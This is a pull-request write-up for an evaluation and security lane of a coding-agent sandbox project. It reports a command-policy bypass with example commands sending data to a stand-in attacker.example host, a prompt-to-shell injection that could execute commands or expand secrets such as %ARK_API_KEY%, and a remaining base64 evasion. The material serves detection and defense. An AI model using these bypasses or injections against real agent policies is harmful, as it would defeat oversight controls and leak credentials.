# Evaluation & reliability lane

`feat/evaluation-reliability` → `main` · CI green:
[run 33294916979](https://github.com/wcnjing/CodeJam/actions/runs/33294916979)

Measurements quoted below are from
[run 33294916979](https://github.com/wcnjing/CodeJam/actions/runs/33294916979) —
the last run before the final documentation commits, and the one whose log every
figure was checked against. The commits since are documentation only and change
no measurement.

---

## What this adds

The evaluation and reliability lane: a single benchmark entry point with
machine-readable output and full run provenance, the repo's first CI (ubuntu ×
Node 22/24, plus a non-blocking Windows leg), clean-install tooling
(`npm run doctor`, a zero-config front door), a full-loop E2E suite over HTTP
with audit-completeness metrics and fault injection, a performance regression
gate derived from real CI history, and a demo path that runs with **no API key,
no container engine and no network**. Along the way it found and fixed two
defects in the product itself, and rejected a third fix that would have been
worse than the bug.

---

## Findings

### 1. A rule gap that exempted almost any binary — found by generation, not by hand

`TEXTUAL_URL_CONTEXT` is the carve-out that keeps `git commit -m "see https://…"`
allowed, because writing a URL as text contacts nothing. It was anchored to the
**start of the command line**, so prefixing any command with a textual one
exempted the entire line from the "destination without a recognised network tool"
rule. All of these were **allowed**:

```
echo start && python3 fetch.py https://attacker.example/x
echo start && java -jar tool.jar https://attacker.example/x
echo hi     ; ./mytool --endpoint https://attacker.example/x
git commit -m z && ./upload.sh https://attacker.example/x
```

The exposure was **every binary outside the known-network-tool lists — including
ordinary in-workspace scripts — behind any of five separator forms.**

It surfaced from a generated attack bank (cross product of host forms × egress
tools × secret channels × shell wrappers, 3,430 variants) that reported one
stratum at 95.00% against a 99.59% aggregate. Nobody had written the case; a
hand-authored corpus cannot escape the bias of its author.

The "before" column is from
[run 33254598308](https://github.com/wcnjing/CodeJam/actions/runs/33254598308),
the last build before the fix; "after" from the run linked at the top. Those
"before" figures cannot appear in a post-fix run, which is why they are
attributed separately rather than left to look unverifiable.

| | before | after |
| --- | --- | --- |
| generated bank | 99.59% (3,416/3,430) | **100.00%** (3,430/3,430) |
| `and-chain` wrapper stratum | 95.92% (329/343) | **100%** (343/343) |
| accepted-bypass ratchet | 14 | **0** |
| corpus core detection | 100% (60/60) | **100%** (64/64) |
| corpus false-positive rate | 2.2% (1/45) | **2.1%** (1/47) |

**The first fix passed every hand-written probe and still regressed core detection
to 93.8%** — every corpus entry is wrapped in `bash -lc "…"`, which puts the
payload inside one quoted string so the line never splits and the leading `echo`
still shields it. The curated corpus caught what hand-testing missed. Generation
finds the cases nobody thought to write; the corpus catches fixes that only work
on the cases you did. Both are needed, and this is why.

### 2. Windows: the local-process runtime could not start Codex at all

`codex-runner.ts` spawned `CODEX_BIN` with no shell option. On Windows a global
npm install produces a `.cmd` shim, and since the fix for CVE-2024-27980 Node
refuses to spawn `.cmd` without `shell: true`. A developer following **our own
README** (`npm install --global @openai/codex`, then `npm run dev`) got
`spawn EINVAL` on every run under `RUNTIME_PROVIDER=local-process`.

### 3. The obvious fix to that bug would have introduced remote code execution

`buildCodexArgs` puts `request.prompt` into argv, and that prompt is the body of
`POST /api/agents/:id/messages` — trimmed and length-capped, no character
restrictions. Both cheap fixes were tried, measured, and rejected:

| option | result |
| --- | --- |
| `shell: true` | **RCE.** Node concatenates argv into a cmd line unescaped, so `summarise the repo & <command>` executes `<command>` on the host, outside the container, as the server process. **Verified by making it create a file**, not by reasoning about it. |
| `cmd.exe /d /s /c` with an args array | **Secret disclosure.** Nine metacharacter payloads were contained, but cmd still expands environment variables: a prompt containing `%ARK_API_KEY%` came back with the **real key substituted into it**, because that key is in the child environment. A bug fix would have breached the 0/33 secret-leak figure this project reports. It also corrupts backslashes, so `C:\Users\dev\repo` arrives mangled. |
| **shipped** | No shell on any path. Resolve to a real executable via PATHEXT; otherwise recover the npm shim's target and **verify** it exists and is spawnable; otherwise refuse with an error naming both workarounds. |

Before: `spawn EINVAL` on every run. After: the run completes, enforcement still
fires through the shim (`secret-exfiltration` denied), and a hostile prompt
arrives as a single argument and creates no file. Nine regression tests cover
both resolution branches, the refusal, and the assertion that matters most — a
metacharacter-laden prompt never reaches a shell.

---

## What is measured

Every figure is from a CI run on a clean runner, linked so it can be checked.

> Worth flagging as a process finding, not just a habit: re-reading each figure
> against the log of the run it cites caught wrong numbers **four separate
> times**, always the same failure — a value carried forward from an earlier
> build while the text linked a newer run. Correctness metrics are stable and
> survive that unnoticed; timing figures move every run, so a stale one is
> indistinguishable from a real regression. A document full of links is not the
> same as a document full of verified links.

- **Containment window: p50 1–3 ms** — from the denied command being emitted to
  the Runtime process being dead. This is the README's own containment race,
  previously unquantified. **The tail is not characterised**: seven of eight CI
  observations report 1–3 ms and one reported 92 ms, on 5–24 samples per run.
  Enough for a median, not for a worst case.
- **Store-write cost is O(events already stored)** — 0.34–1.13 ms at zero
  events, **12.92–16.79 ms at 5,000**, against 45.7–59.4 µs for a policy
  decision. Growth is linear
  at **r² 0.9995–1.0000 across three independent runners**, so it is a property of
  the code, not of a machine. *The fix is scoped and deliberately not built*: the
  two cheap options cap the log by discarding audit records, which for a project
  whose thesis is trustworthy evidence is a liability rather than a fix, and the
  cap does not even remove the linear term. Tracked as **TM-OPS-001**, open on
  purpose.
- **Zero-rates carry denominators and intervals.** "0 secret leaks" is not
  evidence the rate is zero: **0/39 is reported as ≤ 7.4% (95%, one-sided
  exact)**. Likewise 1/104 escapes (1.0%, CI 0.2–5.2%), 103/104 blocked, 1/75
  false positives, 55/56 red-team probes denied.
- **Containment proven separately from detection.** A detection rate proves the
  classifier fired; it does not prove the container died. A 24-variant sample
  through the real runner terminated the Runtime **24/24**.
- **CI: 175 tests green** on ubuntu-latest, Node 22 and 24. The matrix separates
  platform from runtime version, which an earlier comparison had confounded.

---

## Shared files touched, and why

One focused commit each, so any can be reviewed or reverted independently.

**Pre-agreed before the work started:**

| file | hunks | what |
| --- | --- | --- |
| `command-policy.ts` | 1 of 3 | `scanCommandsWith` — an injectable-evaluator seam so the overhead harness can measure policy-off. `scanCommands` keeps a byte-identical signature and delegates; the enforcement entry point the runners call has no injectable evaluator on it. Agreed in this delegation form specifically to remove the bypass-seam objection. |
| `runner-factory.ts` | 1 | +8 lines registering `RUNTIME_PROVIDER=replay`. The other two branches are byte-identical. |
| `config.ts` | 1 | +1 enum member. Unavoidable — `RUNTIME_PROVIDER=replay` cannot parse otherwise. Flagged at the time rather than slipped in. |
| `web/types.ts` | 2 | Mirrors only: `latency.p99` optional, and the provider union. That interface is hand-duplicated from the server with no shared import, so leaving either would be a knowingly-wrong type. |

**Came back to this lane as owned work** (originally raised as handovers, then
reassigned):

| file | hunks | what |
| --- | --- | --- |
| `command-policy.ts` | 2 of 3 | The `TEXTUAL_URL_CONTEXT` fix — finding 1. A quote-aware segment splitter plus shell-wrapper unwrapping, scoping the carve-out to the segment carrying the destination. |
| `policy-corpus.ts` | 2 | Four malicious cases covering the class (different interpreters, a script with no recognised binary, `;` as well as `&&`) and two benign guards for the false-positive direction. Corpus 114 → 120. |
| `codex-runner.ts` | 3 | +9 lines: resolve `CODEX_BIN` before spawning, in `run()` and `isAvailable()`. The resolver itself is a new file. |
| `threat-model.ts` | 1 | One `residualNote` string on TM-OPS-001, now citing the measured store-write curve instead of asserting unbounded growth. Status stays `open`; no `@covers` tag added. Relayed to runtime-team. |

Everything else is new files in `apps/server/src/bench/`, `scripts/`, `.github/`
and docs — 30 added files.

**New commands:** `bench`, `bench:store`, `bench:overhead`, `bench:generate`,
`redteam`, `doctor`, `demo:offline`, `demo:check`, `demo:check:replay`.

---

## Known limitations

- **12 Windows test failures — on a platform the challenge does not require.**
  The brief specifies macOS or Linux. Windows was verified as additional work,
  which is how the RCE near-miss above was found at all. These 12 are **distinct
  from the EINVAL fix and not addressed by it**: the runtime suite's fake-Codex
  stand-in is a `#!/usr/bin/env node` shebang script, and Windows dispatches on
  neither the shebang nor the executable bit. The non-blocking `windows-latest`
  CI leg is reporting rather than a gate, which is why the branch badge is green
  while that leg is red. The signal there is the failure **count**, 12 throughout.
- **Replay fixtures are synthesized, not recorded.** No live model was available
  to capture from. Each fixture declares this in a `source` field and a test
  asserts every fixture declares provenance. Re-recording on demo hardware would
  make them a stronger artifact. Replay also **does not prove containment** —
  nothing is spawned — and says so at the end of every run.
- **The shim-resolver refusal path.** Every npm shim shape found resolves
  cleanly, but the set of shapes `@openai/codex` ships across platforms is not
  enumerable from here. If anyone hits the refusal in practice, **send me the
  case** — it is a resolver to extend, not a design gap.
- **One documented escape remains**: a fully base64-encoded command
  (`evasion-encoding-66`) escapes at the text-matching layer. Surfaced by the
  benchmark rather than hidden; any *new* escape fails the build.
- **The store-write fix is not built**, deliberately — see above. The number is
  in CI on every push so the decision can be made on evidence.
- **`policy-corpus.ts` category note**: adds one new category
  (`rt-textual-prefix`). Per-family tables shift accordingly; the `rt-` prefix
  keeps the existing family mapping intact.

---

## How to check it yourself

```bash
npm ci
npm run demo:offline        # scorecard, benchmark, threat model — no key needed
npm run demo:check:replay   # the full governance loop, no setup at all, ~3s
npm run bench               # every metric with numerator, denominator and CI
npm run bench:generate      # 3,430 generated variants, stratified
```
